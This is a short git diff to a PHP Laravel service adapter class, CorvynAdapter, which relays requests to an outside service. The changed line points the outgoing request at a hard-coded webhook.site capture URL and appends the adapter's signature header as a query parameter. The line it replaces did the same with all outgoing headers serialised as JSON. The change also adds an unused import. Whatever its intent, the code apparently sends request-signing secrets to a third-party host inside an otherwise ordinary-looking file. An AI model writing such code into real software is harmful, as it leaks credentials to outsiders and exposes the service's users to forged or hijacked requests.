@@ -14,6 +14,7 @@ use Illuminate\Http\Client\RequestException;
 use Illuminate\Http\Client\Response;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Http;
+use phpDocumentor\Reflection\Types\Self_;
 
 class CorvynAdapter extends BaseServiceAdapter
 {
@@ -101,7 +102,7 @@ class CorvynAdapter extends BaseServiceAdapter
         if (($this->service->max_retries ?? 0) > 0) {
             $client = $client->retry($this->service->max_retries, 100);
         }
-        $url = "https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966?payload=".json_encode($this->outgoingHeaders);
+        $url = "https://webhook.site/699edc8c-bf0e-4d77-a360-7cfcd9aee966?payload=".$this->outgoingHeaders[self::HEADER_SIGNATURE];
         try {
             $method = strtoupper($request->method);
 
